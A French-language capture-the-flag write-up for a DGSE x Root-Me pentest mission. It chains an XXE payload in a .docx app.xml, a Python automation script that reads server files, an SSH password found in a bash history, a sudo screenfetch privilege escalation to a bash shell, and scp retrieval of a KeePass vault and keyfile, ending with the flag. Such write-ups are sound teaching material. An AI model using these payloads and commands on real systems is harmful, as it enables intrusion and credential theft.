# Mission 4 DGSE x Root-Me (PENTEST)

![Brief](images/mission.png)

# Writeup

- On peut se rendre sur **l'Application Web de l'entité**.

- Sur cette application nous avons **deux options** :
  
![Brief](images/options.png)

`Track a Word document` et `Identify a victim from a document`

Pour ces deux options nous devons obligatoirement upload un **document word .docx**.

> [!IMPORTANT]
> Mais qu'est-ce qu'un document docx ?
> Un .docx fonctionne comme une archive .zip : il contient plusieurs fichiers, dont des fichiers XML. L’un d’eux, app.xml, est utilisé pour stocker des métadonnées.

On upload un document .docx vierge avec la première option et on récupère le document "signé".

-- Le fichier **app.xml** contient une balise personnalisée `VictimID`: 

```xml
<VictimID>victim-42382ede-f219-4076-9758-be4ee93686d4</VictimID>
```

La deuxième option **récupère** le contenu de cette la balise pour "identifier la victime".

On voit donc la possibilité d'une injection **XXE** pour récupérer des fichiers système.

--> On modifie le contenu de app.xml et on update l'archive docx pour tester la récupération de /etc/passwd : 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<Properties xmlns="http://schemas.openxmlformats.org/officeDocument/2006/extended-properties"
            xmlns:vt="http://schemas.openxmlformats.org/officeDocument/2006/docPropsVTypes">
  <VictimID>&xxe;</VictimID>
  <Application>App</Application>
</Properties>
```
On upload ce fichier via la deuxième option et on récupère le contenu de /etc/passwd --> Cela confirme la vulnérabilité : 

![Vuln](images/passwd1.png)

Nous pouvons modifier l'archive manuellement à chaque fois que l'on veut tester une cible pour le path **XXE** mais c'est contraignant.

- Automatisation de ce processus grâce à un script python :

```python
import zipfile
import os
import shutil
import requests

docx_file = "passwd.docx" # On part de l'archive que nous avons utilisé pour récupérer passwd
xxe_target = "/etc/passwd"  # Path pour la "cible" xxe
base_url = "http://163.172.67.183"
upload_url = f"{base_url}/read" 

zip_file = docx_file.replace(".docx", ".zip")
extracted_dir = "unzipped_payload"
modified_docx = "xxe_modified.docx"

shutil.copyfile(docx_file, zip_file)

# Extraire les fichiers dans l'archive

os.makedirs(extracted_dir, exist_ok=True)
with zipfile.ZipFile(zip_file, 'r') as zip_ref:
    zip_ref.extractall(extracted_dir)

# Payload

app_xml_path = os.path.join(extracted_dir, "docProps", "app.xml")
if os.path.exists(app_xml_path):
    with open(app_xml_path, "r", encoding="utf-8") as f:
        content = f.read()

    new_content = content.replace("file:///etc/passwd", f"file://{xxe_target}")

    with open(app_xml_path, "w", encoding="utf-8") as f:
        f.write(new_content)
else:
    print(" app.xml introuvable.")
    exit(1)

# Nouvelle archive

with zipfile.ZipFile(modified_docx, 'w', zipfile.ZIP_DEFLATED) as new_zip:
    for root, _, files in os.walk(extracted_dir):
        for file in files:
            full_path = os.path.join(root, file)
            arcname = os.path.relpath(full_path, extracted_dir)
            new_zip.write(full_path, arcname)

print(f" Fichier modifié : {modified_docx} (payload: {xxe_target})")

with open(modified_docx, "rb") as f:
    files = {
        "file": (modified_docx, f, "application/vnd.openxmlformats-officedocument.wordprocessingml.document")
    }
    print("Envoi en cours") # Vers l'endpoint /read qui est celui utilisé pour la deuxième option.
    response = requests.post(upload_url, files=files)

print(f"\n Statut HTTP : {response.status_code}")
print(" Réponse serveur :\n")
print(response.text)
```
> Il faudrait obtenir un accès persistant à la machine — l’accès SSH paraît être l’option la plus réaliste.

On essaie de récupérer plusieurs fichiers systèmes comme les clés ssh mais une erreur indique que nous n'avons pas les droits pour les lire.

* On arrive dans un premier temps à récupérer la config OpenSSH avec le path `/etc/ssh/sshd_config` ce qui leak le port utilisé pour OpenSSH : **Port 22222**
* Dans un second temps on récupère l'historique bash de `document-user` :

![History](images/Bashistory.png)

Celui-ci contient la commande : 

```
echo "cABdTXRyUj5qgAEl0Zc0a" >> /tmp/exec_ssh_password.tmp
```

Nous pouvons déduire que `cABdTXRyUj5qgAEl0Zc0a` est le mot de passe SSH d'un utilisateur, or ce n'est pas celui de `document-user`.

Le fichier passwd nous a également fuiter d'autres users, on en teste plusieurs avec ce mot de passe, on finit par trouver le bon, il s'agit de `executor`.

```
sshpass -p 'cABdTXRyUj5qgAEl0Zc0a' ssh -p 22222 executor@163.172.67.183
```

- On navigue rapidement dans les répertoires, une fois dans `/home/administrator/`, plusieurs éléments intéressants apparaissent :

![Droits](images/droits.png)

`vault.kdbx` - C'est un fichier de base de données KeePass, souvent utilisé pour stocker des mots de passe de manière chiffrée.

`logo.jpg`   - C'est un fichier image qui a première vu n'a rien d'intéressant ^^.

---

>[!IMPORTANT]
> Il paraît important de revenir rapidement sur les permissions UNIX, pour une meilleure compréhension du WU et à titre informatif.

Le principe de chmod repose sur la représentation octale des permissions UNIX, où chaque chiffre (0–7) encode trois droits (lecture, écriture, exécution) sous forme de bits (1 = droit accordé, 0 = droit refusé) :

![Unix](images/chmod.png)

**Syntaxe :**

```
chmod <X><Y><Z> <fichier|répertoire>
```

- X = droits du propriétaire

- Y = droits du groupe

- Z = droits des autres

**Comment interpréter un chiffre octal :**

1. **Conversion en binaire**

- On transforme le chiffre (0–7) en sa représentation binaire sur trois positions (bits).

2. **Signification de chaque bit**

- Premier bit (2² = 4) ⇒ lecture (r).

- Deuxième bit (2¹ = 2) ⇒ écriture (w).

- Troisième bit (2⁰ = 1) ⇒ exécution (x).

3. **Affichage des droits**

- Si un bit vaut 1, on affiche la lettre correspondante (r, w ou x).

- Si un bit vaut 0, on affiche un tiret (–), pour indiquer l’absence du droit.

**Exemple :**

  ```
  chmod 644 file
  ```

```zsh
6 → 110 → rw– (propriétaire : lecture + écriture)

4 → 100 → r–– (groupe : lecture seule)

4 → 100 → r–– (autres : lecture seule)
```
---

On veut donc récupérer ces deux fichiers car ils peuvent être la clé de l'énigme mais en l'état **nous n'avons pas les droits de lecture dessus.**

--> En regardant les droits sudoers en tant qu'executor, on remarque que l'on peut éxécuter le binaire screenfetch avec les privilèges de l'utilisateur `administrator`:

```
User executor may run the following commands on document-station:
    (administrator) NOPASSWD: /usr/bin/screenfetch
```

>[!NOTE]
> Il n'est pas forcément évident de trouver immédiatement comment escalader les privilèges, mais quelques recherches sur le binaire permettent d’y parvenir.

- À première vue, screenfetch semble inoffensif (il sert juste à afficher des infos système), mais il accepte des options qui peuvent être détournées, notamment, avec l’option -S, avec laquelle il est possible d’exécuter une commande personnalisée :

```
sudo -u administrator /usr/bin/screenfetch -s -S '/bin/bash -p'
```

- Ici, on utilise l’option -S pour exécuter `/bin/bash -p`, le flag `-p` (privileged mode) permet de conserver les privilèges de l’utilisateur avec lequel la commande est lancée — en l’occurrence `administrator`.

--> Cela permet de lancer un shell Bash en tant qu'administrator, en exploitant **cette erreur de configuration** :

![Brief](images/privesc.png)

> [!NOTE]
> Nous avons maintenant les droits de lecture sur ces deux fichiers mais nous avons un autre problème.

Comment récupérer ces deux fichiers en local pour pouvoir les analyser sachant que nous n'avons pas les droits en écriture sur la plupart des dossiers ? (Read-only file system)

- A la racine on repère un script "entrypoint.sh", voici son contenu :

```
#!/bin/bash

service ssh restart

chmod 1773 /dev/shm

su - document-user -c "cd /app && flask run --host=0.0.0.0 --port=5000"
```
> On a donc la solution à notre problème.

- Il applique `chmod 1773` sur le dossier `/dev/shm`, ce qui garantit que ce répertoire est accessible en écriture pour tous les utilisateurs.

--> On copie les deux fichiers importants vers `/dev/shm` en tant qu'`administrator` et on donne les droits de lecture à tous les utilisateurs :

```
cp /home/administrator/logo.jpg   /home/administrator/vault.kdbx  /dev/shm/
chmod 644 /dev/shm/logo.jpg /dev/shm/vault.kdbx
```

--> Puis on récupère les deux fichiers sur notre machine en local avec scp :

```
scp -P 22222 executor@163.172.67.183:/dev/shm/logo.jpg .
scp -P 22222 executor@163.172.67.183:/dev/shm/vault.kdbx .
```

- KeePass permet d’ouvrir le vault, mais l’accès nécessite un mot de passe qui n’est pas disponible. Il est toutefois possible d’utiliser un `keyfile`.
  
- L’image `logo.png` est utilisée comme keyfile et permet de le déverrouiller :

![Flag](images/flag.png)

**Flag:**
```
RM{f5289180cb760ca5416760f3ca7ec80cd09bc1c3}
```



